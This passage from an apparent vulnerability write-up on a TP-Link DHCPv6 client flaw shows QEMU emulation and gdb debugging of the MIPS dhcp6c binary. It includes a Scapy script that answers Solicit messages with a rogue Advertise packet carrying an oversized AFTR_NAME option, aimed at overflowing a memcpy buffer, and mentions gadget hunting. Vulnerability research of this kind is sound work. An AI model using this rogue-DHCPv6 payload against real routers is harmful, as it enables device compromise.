</span></span><span style="display:flex;"><span>    udp_layer <span style="color:#f92672">=</span> UDP(sport<span style="color:#f92672">=</span><span style="color:#ae81ff">547</span>, dport<span style="color:#f92672">=</span><span style="color:#ae81ff">546</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style="display:flex;"><span>    client_duid <span style="color:#f92672">=</span> p[DHCP6OptClientId]<span style="color:#f92672">.</span>duid
</span></span><span style="display:flex;"><span>    trid <span style="color:#f92672">=</span> p[DHCP6_Solicit]<span style="color:#f92672">.</span>trid
</span></span><span style="display:flex;"><span>    dhcp6_advertise <span style="color:#f92672">=</span> DHCP6_Advertise(trid<span style="color:#f92672">=</span>trid)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create DHCPv6 options</span>
</span></span><span style="display:flex;"><span>    client_id <span style="color:#f92672">=</span> DHCP6OptClientId(duid<span style="color:#f92672">=</span>client_duid)  <span style="color:#75715e"># Client Identifier option</span>
</span></span><span style="display:flex;"><span>    server_id <span style="color:#f92672">=</span> DHCP6OptServerId(duid<span style="color:#f92672">=</span>DUID_LLT(hwtype<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, lladdr<span style="color:#f92672">=</span>src_mac))  <span style="color:#75715e"># Server Identifier option</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Combine all layers and send packet</span>
</span></span><span style="display:flex;"><span>    pck <span style="color:#f92672">=</span> ethernet_layer <span style="color:#f92672">/</span> ipv6_layer <span style="color:#f92672">/</span> udp_layer <span style="color:#f92672">/</span> dhcp6_advertise <span style="color:#f92672">/</span> server_id <span style="color:#f92672">/</span> client_id
</span></span><span style="display:flex;"><span>    sendp(pck, iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;br0&#34;</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>interface <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;br0&#39;</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> sniff(iface<span style="color:#f92672">=</span>interface, filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;udp and port 546&#34;</span>, prn<span style="color:#f92672">=</span>send_dhcp6_advertise, lfilter<span style="color:#f92672">=</span>filter_solicit_msg)
</span></span></code></pre></div><p>And on the qemu VM, we can see that the advertise message is received and <code>dhcp6_get_options</code> is called to get each options and then the client responds with a request message:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/ <span style="color:#75715e"># /usr/sbin/dhcp6c -dDf -c test.conf  eth0</span>
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>0, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">1072</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: client6_recv: receive advertise from fe80::542b:76ce:631b:36ce%eth0 on eth0
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option server ID, len <span style="color:#ae81ff">14</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49:   DUID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option client ID, len <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49:   DUID: 00:03:00:01:00:11:22:33:44:55
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: client6_recvadvert: server ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8, pref<span style="color:#f92672">=</span>-1
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:49: client6_recvadvert: reset timer <span style="color:#66d9ef">for</span> eth0 to 0.973980
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: select_server: picked a server <span style="color:#f92672">(</span>ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: client6_send: a new XID <span style="color:#f92672">(</span>a447e5<span style="color:#f92672">)</span> is generated
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: copy_option: set server ID <span style="color:#f92672">(</span>len 14<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/30/2024 00:30:50: client6_send: send request to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span></code></pre></div><h5 id="analysis-and-debuging">Analysis and debuging<a href="#analysis-and-debuging" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>OK cool, now we have a working environment to start our debugging. We will use <code>gdbserver</code> to start the binary and connect to it from our host.</p>
<p>In the qemu VM we start <code>gdbserver</code> with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/dhcp6c -dDf -c test.conf 
</span></span><span style="display:flex;"><span> eth0
</span></span></code></pre></div><p>From our host using the qemu VM IP address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@dilag:# gdb-multiarch
</span></span><span style="display:flex;"><span>GNU gdb <span style="color:#f92672">(</span>Ubuntu 14.0.50.20230907-0ubuntu1<span style="color:#f92672">)</span> 14.0.50.20230907-git
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> Free Software Foundation, Inc.
</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span></span><span style="display:flex;"><span>This is free software: you are free to change and redistribute it.
</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show copying&#34;</span> and <span style="color:#e6db74">&#34;show warranty&#34;</span> <span style="color:#66d9ef">for</span> details.
</span></span><span style="display:flex;"><span>This GDB was configured as <span style="color:#e6db74">&#34;x86_64-linux-gnu&#34;</span>.
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show configuration&#34;</span> <span style="color:#66d9ef">for</span> configuration details.
</span></span><span style="display:flex;"><span>For bug reporting instructions, please see:
</span></span><span style="display:flex;"><span>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
</span></span><span style="display:flex;"><span>Find the GDB manual and other documentation resources online at:
</span></span><span style="display:flex;"><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>For help, type <span style="color:#e6db74">&#34;help&#34;</span>.
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;apropos word&#34;</span> to search <span style="color:#66d9ef">for</span> commands related to <span style="color:#e6db74">&#34;word&#34;</span>.
</span></span><span style="display:flex;"><span>Loading GEF...
</span></span><span style="display:flex;"><span>GEF is ready, type <span style="color:#e6db74">&#39;gef&#39;</span> to start, <span style="color:#e6db74">&#39;gef config&#39;</span> to configure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">304</span> commands loaded <span style="color:#66d9ef">for</span> GDB 14.0.50.20230907-git using Python engine 3.11
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Not found /root/.gef.rc, GEF uses default settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gef&gt; set architecture mips
</span></span><span style="display:flex;"><span>The target architecture is set to <span style="color:#e6db74">&#34;mips&#34;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gef&gt; target remote 10.212.141.194:1234
</span></span></code></pre></div><p>We can now start our debugging. We already know  from earlier analysis that the packet sent by the DHCPv6 server will be used to construct the pointer <code>p</code> which contains the raw data of all DHCPv6 options sent. Let&rsquo;s add a breakpoint into the <code>sub_405f08</code> function beginning and inspect the first argument which is the pointer we are looking for.</p>
<pre tabindex="0"><code>gef&gt; b *0x405f08+1
Breakpoint 1 at 0x405f09
gef&gt; b *0x405f08+1
Breakpoint 1 at 0x405f09
gef&gt; c
Continuing.

Breakpoint 1, 0x00405f09 in ?? ()
.
.
.
gef&gt; telescope $a0 -n
   $a0  0x7fffe5ec|+0x0000|+000: 0x0e000200
        0x7fffe5f0|+0x0004|+001: 0x01000100
        0x7fffe5f4|+0x0008|+002: 0x00000000
        0x7fffe5f8|+0x000c|+003: 0x482c30da
        0x7fffe5fc|+0x0010|+004: 0x0100a859
        0x7fffe600|+0x0014|+005: 0x03000a00
        0x7fffe604|+0x0018|+006: 0x11000100
        0x7fffe608|+0x001c|+007: 0x55443322
</code></pre><p>For some reason we don&rsquo;t know at this time, we need to add <code>+1</code> to the address we get from Ghidra to get the correct disassembly instructions or correct pointer.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179_2024_1179/Pasted%20image%2020241030033130.png"/><figcaption><h4> </h4></figcaption></figure>
<p>So this is our <code>p</code> pointer beginning. As we know that it is of type <code>dhcp6opt</code> we can deduce <code>type</code> and <code>len</code> for the first DHCPv6 options. We have the value <code>0x0e000200</code>,  and the definition is :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dhcp6opt {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_type;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_len;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* type-dependent data follows */</span>
</span></span><span style="display:flex;"><span>} <span style="color:#a6e22e">__attribute__</span> ((__packed__));
</span></span></code></pre></div><p>Thus, we have:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>type<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0002</span>  <span style="color:#f92672">==&gt;</span> <span style="color:#75715e">// SERVERID option according to https://datatracker.ietf.org/doc/html/rfc8415#section-24
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>len<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000e</span>
</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span>server duid
</span></span></code></pre></div><p>If we analyze the Advertise packet we sent through Wireshark, we can easily understand that the content at the <code>p</code> pointer that gets passed to the function is nothing than the options part of the packet we sent:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034134.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034324.png"/><figcaption><h4> </h4></figcaption></figure>
<p>This confirms our intuition. The <code>p</code> content is just <strong>the raw data of all the DHCPv6 options part of our packet</strong>, which is under our control. This means that we can indeed control the content of the <code>p</code> pointer that get passed to the <code>dhcp6_get_options</code> function. The options we are interested in is the <code>AFTR_NAME</code> options, that is where our <code>memcpy</code> is. As we saw earlier the <code>memcpy</code> follows the pattern below, where <code>cp</code> is just the beginning of our <code>AFTR_NAME</code> options raw data, which we can indeed control:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(optinfo_something,cp,(<span style="color:#66d9ef">uint16_t</span>)(cp<span style="color:#f92672">-&gt;</span>len));
</span></span></code></pre></div><p>Let&rsquo;s add this options to our packet and inspect the <code>memcpy</code> call.
Unfortunately, there is no <code>AFTR_NAME</code> option implemented in Scapy. We will build it ourselves. To have more control over what we are doing, we will simply build this option as raw data using python bytes strings. But, first, we need to understand how DHCPv6 option is constructed. From the RFC, DHCP options follow the format below:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030040030.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can indeed confirm this format  using the packet captured by Wireshark:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034134.png"/><figcaption><h4> </h4></figcaption></figure>
<p><code>0x0002</code> is the server Identifier<code>option</code> code, <code>0x000e</code> is the <code>Length</code> of this options, the following is server <code>DUID</code> which represent here the option data.
Especially for <code>AFTR_NAME</code>, we have the following format and description:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030092506.png"/><figcaption><h4> </h4></figcaption></figure>
<p>So following the format we saw earlier, we will construct our dhcpv6 <code>AFTR_NAME</code> option. The option code is 64, length is the length of the payload, and then we will append the payload. The payload also follows a format described in the previous capture. The format of this payload needs to conform to the format of after_name described by the RFC. The length of each DNS label string must be specified, and the length will be converted to <code>.</code> started from the second one. The DNS label is normally limited to <code>63</code> octets. For example, in the above example, when the payload is <code>\x04aftr\x07example\x03com\x00</code> , the result after the program parses it is <em>aftr.example.com</em>. Using this format and description, we write the following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_dhcp6_advertise</span>(p):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style="display:flex;"><span>    src_mac <span style="color:#f92672">=</span> br0_mac  <span style="color:#75715e"># Bridge interface MAC address</span>
</span></span><span style="display:flex;"><span>    dst_mac <span style="color:#f92672">=</span> p[Ether]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s MAC address from original packet</span>
</span></span><span style="display:flex;"><span>    ethernet_layer <span style="color:#f92672">=</span> Ether(src<span style="color:#f92672">=</span>src_mac, dst<span style="color:#f92672">=</span>dst_mac)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style="display:flex;"><span>    ipv6_dst <span style="color:#f92672">=</span> p[IPv6]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s IPv6 address from original packet</span>
</span></span><span style="display:flex;"><span>    ipv6_src <span style="color:#f92672">=</span> br0_link_local_inet6  <span style="color:#75715e"># Bridge interface link-local address</span>
</span></span><span style="display:flex;"><span>    ipv6_layer <span style="color:#f92672">=</span> IPv6(src<span style="color:#f92672">=</span>ipv6_src, dst<span style="color:#f92672">=</span>ipv6_dst)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Port 547: Server port, Port 546: Client port</span>
</span></span><span style="display:flex;"><span>    udp_layer <span style="color:#f92672">=</span> UDP(sport<span style="color:#f92672">=</span><span style="color:#ae81ff">547</span>, dport<span style="color:#f92672">=</span><span style="color:#ae81ff">546</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style="display:flex;"><span>    client_duid <span style="color:#f92672">=</span> p[DHCP6OptClientId]<span style="color:#f92672">.</span>duid
</span></span><span style="display:flex;"><span>    trid <span style="color:#f92672">=</span> p[DHCP6_Solicit]<span style="color:#f92672">.</span>trid
</span></span><span style="display:flex;"><span>    dhcp6_advertise <span style="color:#f92672">=</span> DHCP6_Advertise(trid<span style="color:#f92672">=</span>trid)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create DHCPv6 options</span>
</span></span><span style="display:flex;"><span>    client_id <span style="color:#f92672">=</span> DHCP6OptClientId(duid<span style="color:#f92672">=</span>client_duid)  <span style="color:#75715e"># Client Identifier option</span>
</span></span><span style="display:flex;"><span>    server_id <span style="color:#f92672">=</span> DHCP6OptServerId(duid<span style="color:#f92672">=</span>DUID_LLT(hwtype<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, lladdr<span style="color:#f92672">=</span>src_mac))  <span style="color:#75715e"># Server Identifier option</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># AFTR_NAME option</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># &gt;&gt;&gt; hex(63) == &#39;0x3f&#39;</span>
</span></span><span style="display:flex;"><span>	code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x40</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># aftr_name: size + string + size + string + ... +</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#75715e"># very long AFTR_NAME</span>
</span></span><span style="display:flex;"><span>	aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Combine all layers and send packet</span>
</span></span><span style="display:flex;"><span>    pck <span style="color:#f92672">=</span> ethernet_layer <span style="color:#f92672">/</span> ipv6_layer <span style="color:#f92672">/</span> udp_layer <span style="color:#f92672">/</span> dhcp6_advertise <span style="color:#f92672">/</span> server_id <span style="color:#f92672">/</span> client_id <span style="color:#f92672">/</span> aftr_name_option
</span></span><span style="display:flex;"><span>    sendp(pck, iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;br0&#34;</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>For the payload, you can see that we create such a big <code>AFTR_NAME</code> (approximately more than 500 bytes). We will now inspect the <code>memcpy</code> call to see what happens, we just need to set a breakpoint before the <code>memcpy</code> and inspect the arguments:</p>
<pre tabindex="0"><code>gef&gt; b *0x004061c6+1
Breakpoint 1 at 0x4061c7
gef&gt; c
</code></pre><p>We can see this on the breakpoint hit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------------------------------------------------------------</span> <span style="color:#a6e22e">arguments</span> (guessed) <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x419261</span> <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span> (
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">$</span>a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf793969a</span>,
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">$</span>a1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffe611</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x61616161</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa<span style="color:#960050;background-color:#1e0010">&#39;</span>...,
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">$</span>a2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000030</span>,
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">$</span>a3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>,
</span></span><span style="display:flex;"><span>   [sp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000003d4</span>,
</span></span><span style="display:flex;"><span>   [sp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>That is our <code>memcpy</code> call. We can see that the <code>src(a1 register)</code> is indeed our packet payload and the <code>size (a2 register)</code> is the size of each <code>aftr_name</code> part. Now we understand more clearly. The <code>memcpy</code> is copying each part of <code>aftr_name</code> into a buffer which will then be processed to form the final <code>aftr_name</code> (Example: <code>\x04aftr\x07example\x03com\x00</code> will become <code>aftr.example.com</code>). If we look more closely to the destination pointer (<code>a0 register</code>), it is weird at first time but get correct stack address if we advance in one step in the code (after the branching). That is due to something called delay slot branching on MIPS architecture.</p>
<blockquote>
<p>[!note]
On the MIPS architecture, jump and branch instructions have a &ldquo;delay slot&rdquo;. This means that the instruction after the jump or branch instruction is executed before the jump or branch is executed.
In addition, there is a group of &ldquo;branch likely&rdquo; conditional branch instructions in which the instruction in the delay slot is executed only if the branch is taken.
The MIPS processors execute the jump or branch instruction and the delay slot instruction as an indivisible unit. If an exception occurs as a result of executing the delay slot instruction, the branch or jump instruction is not executed, and the exception appears to have been caused by the jump or branch instruction. This takes some time to get used to when looking for gadgets. Each time a call/jump is performed, we need to look at the next instruction as well. This can mess up the gadget or actually provide a crucial instruction to make a gadget usable.
<a href="https://www-local.pdc.kth.se/doc/totalview/wwhelp/wwhimpl/common/html/wwhelp.htm?context=Reference&file=MIPSDelaySlotInstructions.html">https://www-local.pdc.kth.se/doc/totalview/wwhelp/wwhimpl/common/html/wwhelp.htm?context=Reference&file=MIPSDelaySlotInstructions.html</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> si
</span></span><span style="display:flex;"><span>warning: GDB can<span style="color:#960050;background-color:#1e0010">&#39;</span>t find the start of the function at <span style="color:#ae81ff">0x419261</span>.
</span></span><span style="display:flex;"><span>warning: GDB can<span style="color:#960050;background-color:#1e0010">&#39;</span>t find the start of the function at <span style="color:#ae81ff">0x419261</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00419261</span> in <span style="color:#f92672">??</span> ()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[ Legend: Modified <span style="color:#66d9ef">register</span> <span style="color:#f92672">|</span> Code <span style="color:#f92672">|</span> Heap <span style="color:#f92672">|</span> Stack <span style="color:#f92672">|</span> Writable <span style="color:#f92672">|</span> ReadOnly <span style="color:#f92672">|</span> None <span style="color:#f92672">|</span> RWX <span style="color:#f92672">|</span> String ]
</span></span><span style="display:flex;"><span><span style="color:#f92672">-------------------------------------------------------------------------------------------------------------</span> registers <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>zero<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r0   : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>at<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r1     : <span style="color:#ae81ff">0x1000a400</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>v0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r2     : <span style="color:#ae81ff">0x7fffead0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>v1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r3     : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r4     : <span style="color:#ae81ff">0x7fffead0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r5     : <span style="color:#ae81ff">0x7fffe611</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x61616161</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa<span style="color:#960050;background-color:#1e0010">&#39;</span>...
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r6     : <span style="color:#ae81ff">0x00000030</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r7     : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r8     : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r9     : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r10    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r11    : <span style="color:#ae81ff">0x656c202c</span> (<span style="color:#960050;background-color:#1e0010">&#39;</span>, le<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">?</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t4<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r12    : <span style="color:#ae81ff">0x86cefde4</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t5<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r13    : <span style="color:#ae81ff">0x780052c0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t6<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r14    : <span style="color:#ae81ff">0x00000000</span>
